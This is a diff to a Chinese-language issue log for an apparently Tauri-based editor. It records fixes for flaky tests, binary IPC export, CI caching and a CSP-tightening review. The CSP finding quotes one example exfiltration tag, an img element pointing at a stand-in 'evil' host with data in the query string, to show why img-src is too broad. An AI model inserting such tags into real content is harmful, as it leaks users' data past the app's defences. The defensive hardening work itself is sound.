@@ -69,17 +69,27 @@
 - **注意:** 迁移前后须真机回归全部涉盘流程（NOT_VERIFIED 清单见 CHANGELOG ISS-197 条目）。
 - **收口（2026-08-29）:** Rust 新增 write_binary_export（.docx 白名单+denied-root+独立 MAX_EXPORT_BYTES=200MB,与资产上限分离防「升级后导不出」回归）与 read_presentation_resource（独立 PRESENTATION_RESOURCE_EXTENSIONS 白名单覆盖图片/JS/CSS/视频/音频/字体——review MAJOR-1:复用图片白名单会让演示页非图片资源全部静默失效）;前端 5 调用面切换;capabilities 删除 fs 插件全部权限,契约测试锚定「插件面零残留」;word 导出链贯穿 docPath 上下文,相对图片解析为绝对路径（review MAJOR-2,%20 解码与 htmlPresentationService 同语义）;导出失败接 notifyIoError 三语言提示（review MAJOR-3:此前 catch 只有 console.error,用户零感知）。review MINOR 登记:①write_binary_export 的 Vec<u8> JSON 序列化 IPC 内存峰值（与 read 侧 tauri::ipc::Response 优化不对称,后续用 Request/ResponseBody 收敛）;②PRESENTATION_RESOURCE_EXTENSIONS 无直接 Rust 单测（经 e2e/手测覆盖）。**NOT_VERIFIED（真机,移交用户）:** Word 导出（含 >20MB 图文文档）、微信导出、另存为、HTML 演示本地资源（重点 JS/CSS/视频内联）、Word 导出内嵌本地图片。
 
-#### ⬜ ISS-215 write_binary_export IPC 序列化内存峰值（ISS-201 review MINOR-1,2026-08-29）
+#### ✅ ISS-214 测试套件并发 flaky——CI 假红根源（已 PR #160,2026-08-30 squash merge 154b0bb;reviewer-160b 独立复核 APPROVE,决定性细节:mock 工厂须返回 hoisted 单例对象而非工厂内新建 vi.fn,否则 reset 后拿全新未 primed fn 复现同类 flaky;同款模式 4 文件按「再现再修」;MINOR 死参数不收)
+
+- **现象:** 全量满并发偶发随机失败(AppLayoutSourceEditor / AppLayoutSystemOpenSource / WechatPreviewPane / AppearanceSection / imageAssetPersistenceService 等,每轮集合不同);CI 假红一轮(#159)。
+- **根因定位:** imageAssetPersistenceService.test.ts 用 per-test `vi.doMock` + `afterEach vi.resetModules()`——多文件共享 worker 时,该组合偶发让被测函数内动态 `import('@tauri-apps/api/core')` 命中**未 mock 的原始模块**(Tauri IPC 空跑),invoke 计 0 次。
+- **修复:** 顶层 `vi.mock`(hoisted 单例 coreInvokeMock)+ `useInvokeMock()` 每用例显式 mockReset,mock 注册与模块加载解耦。
+- **验证:** 复现组合(AutoReload+persist 同跑)20 轮 18/20 → 20/20;全量 797/797 ×6 稳定绿。
+- **备注:** 其余 flaky 文件(如 WechatPreviewPane 等)若再现,按同模式排查(mock 时序/共享 worker 污染)。
+
+#### 🖥 ISS-215 write_binary_export IPC 序列化内存峰值（已 PR #161,2026-08-29;ISS-201 review MINOR-1）
 
 - **发现:** write_binary_export 的 bytes 走 Vec<u8> JSON 数字数组序列化,大 docx（200MB 级）导出有数倍内存峰值,与 read 侧已用 tauri::ipc::Response 的优化不对称。
 - **建议:** 改用 tauri::ipc::Request/ResponseBody 收敛;顺带为 PRESENTATION_RESOURCE_EXTENSIONS 补直接 Rust 单测（review MINOR-2）。
+- **实现（2026-08-29,闲时工兵 zcode-idle）:** 命令签名改 `fn write_binary_export(request: tauri::ipc::Request)`——字节经 `InvokeBody::Raw` 原样直达（前端 `invoke(cmd, new Uint8Array(buffer))`,@tauri-apps/api 2.11 InvokeArgs 原生支持二进制 body）;路径经自定义 header `x-folia-export-path` 携带（前端 encodeURIComponent 保证 ASCII,Rust `percent-decode` + UTF-8 校验还原,percent-encoding 由 reqwest 传递依赖提升为直接依赖,零新增下载）。校验链抽为可单测纯函数 `write_export_bytes`（.docx 白名单 + denied-root + 200MB 上限零变化）;Request 薄壳（headers/body 匹配）不可单测,归真机验证。MINOR-2 落地:`presentation_resource_whitelist_is_anchored_and_mime_covered` 锚定 28 扩展 + mime 全映射 + 大小写折叠 + 白名单外 fail-closed。验证:cargo test 59/59（含新增 decode_export_path_header 中文路径 round-trip/非法 UTF-8 拒绝）、前端 797/797、typecheck/lint 零错误。**NOT_VERIFIED（真机,移交用户）:** 大 docx 真实导出内存峰值与成功率、raw invoke 在 WKWebView 的 fetch-IPC 路径实跑。
 
-#### ⬜ ISS-213 release.yml 的 rust-cache workdir 同款失效（ISS-212 review 顺带发现,2026-08-29）
+#### ✅ ISS-213 release.yml 的 rust-cache workdir 同款失效（已 PR #162,2026-08-30 squash merge 1795514;reviewer-batch 上游核实 action.yml 已完全移除 workdir 输入;运行时缓存 key 恢复 NOT_VERIFIED 留待下次 tag push 观察）
 
 - **发现:** release.yml:40-42 的 `Swatinem/rust-cache@v2` 仍用已废弃的 `workdir` 输入,同 ci.yml MAJOR-1——缓存 key 退化为空串哈希、路径错位,release 构建每次全量冷编译拖慢发版。
 - **建议:** 改 `workspaces: src-tauri`,与 ci.yml 修复同构。
+- **修复交付(2026-08-30,zcode-idle worker):** workdir→workspaces 单点同构修复;YAML 语法/单处 rust-cache/与 ci.yml 输入逐字一致断言通过;workflows 目录 workdir 零残留。运行时缓存 key 恢复需真实 release run(tag push)——NOT_VERIFIED 留下次发版观察。
 
-#### ⬜ ISS-202 CSP 收紧评估：摘 unsafe-eval + img-src 外泄通道收敛
+#### 🖥 ISS-202 CSP 收紧评估：摘 unsafe-eval + img-src 外泄通道收敛（试验段已 PR #163,2026-08-30;img-src 等产品口径）
 
 - **发现:** `tauri.conf.json:31` script-src 同时含 `'unsafe-eval' 'unsafe-inline'`，CSP 对 XSS 失去第二道拦截价值，DOMPurify 白名单成为唯一防线；`img-src http: https:` 是现成数据外泄通道（`<img src="https://evil/?d=...">` 绕过 `connect-src 'self'`）。img-src 的放开是 ISS-110/ISS-178 有意为之（外部图床图片加载），需产品层面权衡。
 - **建议:** 排查 Vditor/KaTeX/Mermaid 对 eval 的真实依赖逐项灰度摘除；保留并测试锚定 `connect-src 'self'`。
